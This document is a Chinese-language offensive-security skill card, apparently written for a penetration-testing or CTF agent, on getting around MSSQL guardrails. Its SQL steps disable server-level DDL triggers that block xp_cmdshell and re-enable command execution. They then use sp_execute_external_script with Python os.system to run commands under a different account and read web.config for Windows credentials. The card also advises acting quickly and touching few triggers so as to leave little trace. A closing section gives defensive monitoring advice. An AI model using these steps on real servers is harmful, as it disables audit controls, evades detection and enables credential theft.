---
name: 'mssql-guardrail-bypass'
description: 'MSSQL 防护绕过与执行上下文差异：服务器级 DDL 触发器拦 xp_cmdshell（sa 可自行 DISABLE 掉它）＋ 同一主机上换 RCE 机制=换 token（xp_cmdshell 的服务账号 vs 外部脚本宿主的独立账号），ACL 只挡得住其中一个。含"先固定每个机制的身份"清单与防守侧教训。（检索词：mssql/trigger/server_triggers/DISABLE TRIGGER/xp_cmdshell blocked/被触发器拦/external scripts/sp_execute_external_script/执行上下文/token 差异/different token/Access denied/ACL/防护绕过/guardrail/bypass/绕过防护）'
whenToUse: 'enable xp_cmdshell 报错里带 trigger；或 xp_cmdshell 能跑命令、但读目标文件/写目录时 Access denied'
metadata: { domain: db, tier: T3 }
---

# MSSQL：防护绕过与执行上下文差异

> 两个独立问题，症状不同、别混：
> **A. 命令执行被"装置"拦住**（触发器/策略）—— 能不能绕。
> **B. 命令执行成功，但操作被"身份"拦住**（ACL 拒绝）—— 换机制就换身份，不是死路。

## 0. 症状 → 定位

| 症状 | 病因 | 去 |
|---|---|---|
| `enable xp_cmdshell` 报错出现 `trigger` / `transaction ended in the trigger` / "Attempt to ... detected" | **服务器级 DDL 触发器**在拦，属"告警型装置" | §A |
| `sp_configure 'xp_cmdshell'` 生效但 `xp_cmdshell whoami` 无输出 | 见 `mssql-attack-chain` 输出捕获节 | — |
| 命令**能执行**，但 `type/icacls/copy` 目标路径 `Access is denied` | **执行身份**不在 ACL 允许列表里 | §B |
| 同一条命令换机制换了身份 | 正常现象，机制 = 身份 | §B |

## A. 服务器级 DDL 触发器（xp_cmdshell 的"守卫"）

```sql
-- ① 先确认它是不是触发器干的（报错文本里带 trigger / 被明确点名）
-- ② 列服务器级触发器（DDL trigger，不是 DML trigger）
SELECT name, is_disabled FROM sys.server_triggers;
-- 名字通常自解释（含 alert / xp_cmdshell / audit 等词）→ 一眼认出防线在守什么

-- ③ 关掉它（sa / 或对该触发器有 ALTER 权限）
DISABLE TRIGGER <TRIGGER_NAME> ON ALL SERVER;

-- ④ 再启用并执行
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

🔴 **这类装置是"告警"不是"加固"**：能拦住的原因是你**没有权限关它**，一旦是 sa，它就是一条可以被自己拆掉的报警器。所以：
- **时间敏感**：拆触发器的动作本身大概率已经触发过一次告警（"attempt detected" 说明它先记录、再中止）→ 不要在这个阶段慢慢试探。
- **先枚举再动手**：`sys.server_triggers` 全列一遍；只关挡路的那一个，其余别碰（少留痕迹）。
- **同类装置清单**：服务器级 DDL 触发器、Database DDL 触发器、`sp_configure` 的值被锁的 `sys.configurations`、扩展存储过程被删（需要重建）、SQL 审计（Audit 对象）。
- 被删掉 `xp_cmdshell` 本体时（`OBJECT_ID` 返回 NULL）走 `mssql-attack-chain` §8 的替代链。

## B. 执行上下文差异：换机制 = 换 token

**同一台主机上，不同的"代码执行机制"跑在不同的 Windows 身份下**，因此对同一个文件的 ACL 判定结果可能完全相反。

| 机制 | 谁在跑（典型） | 备注 |
|---|---|---|
| `xp_cmdshell` | **SQL Server 服务账号**（虚拟账号 `NT SERVICE\MSSQL$<实例>` 或域服务账号） | 最常被优先尝试，也最常被 ACL 挡住 |
| `sp_execute_external_script`（R/Python，2016+，需 `external scripts enabled`） | **外部脚本宿主（Launchpad）自己的账号**，与 SQL 服务账号**不同**（安装期创建的专用低权账号 / app-container 身份） | 本题型的关键一招；账号名随安装方式不同，**必须实测** |
| SQL Agent Job | 服务账号，或显式配置的 proxy 账号 | 有 proxy 时身份可与服务账号不同 |
| OLE Automation（`sp_OACreate`） | in-proc，即 `sqlservr.exe` 自身（身份≙服务账号） | 换不了身份，只换"能不能用" |

```sql
-- 启用外部脚本（需 sysadmin）
EXEC sp_configure 'external scripts enabled', 1; RECONFIGURE;
-- 先冒烟
EXEC sp_execute_external_script @language=N'Python', @script=N'print("ok")';
-- 固定身份（🔴 拿到 shell 后 第一件事就是这个）
EXEC sp_execute_external_script @language=N'Python', @script=N'import os; os.system("whoami");';
-- 用这个身份去读之前被拒的文件（Windows 口令常在 web 应用的配置文件里）
EXEC sp_execute_external_script @language=N'Python', @script=N'import os; os.system("type C:\inetpub\wwwroot\web.config");';
```

🔴 **可复用的动作**：**每上一个新机制，先 `whoami` 一次并把"机制→身份"记进台账**。身份是可枚举资源，不是环境噪声。
🔴 **反向也成立**：换机制后权限可能**更低**（专用账号常被刻意削权）→ 失败了不是"此路不通"，只是"这个身份不通"。
🔴 别只换机制不换**路径写法**：同一文件在服务账号下可能因共享/UNC 权限不同而表现不一致。

## C. 通用原则（这两条能跨题型复用）

1. **约束是"身份 × 机制"的函数，不是主机的函数**。"这机器读不到 X" 通常应改口为"**这个身份**读不到 X"。
2. **装置只对它拦得住的那条路径有效**。审计触发器拦 `sp_configure xp_cmdshell`，不拦外部脚本启用语句（后者在 `sys.configurations` 里是另一个开关）→ 逐条列出"防线清单"再找**没被覆盖的那条**。

## D. 蓝队视角（本卡最该外带的一节）

- **别把告警触发器当唯一防线**：它的 DISABLE/ALTER/DROP 是普通 DDL 事件，**必须外发到 SIEM**，否则"守卫被自己人拆掉"这件事在本地不留痕。
- 监控点：`sys.server_triggers` 被 disable/drop、`sp_configure` 的 `xp_cmdshell` / `external scripts enabled` 值变化、`sp_execute_external_script` 调用（含脚本正文里的 `os.system/subprocess`）。
- 收敛 sysadmin 数量（本卡的 A 与 B 都只需一个 sa）；SQL 服务账号与外部脚本账号都按最小权限配置，且**不要因为其中一个被 ACL 挡住就以为文件安全了**。

## 相关卡

- 前置：拿 sa / 链接服务器 / 命令执行 → `mssql-attack-chain`
- 拿到 web.config 类配置后找凭据 → `credential-hunting-locations`
- 落地到 Windows 后的提权 → `windows-privesc`
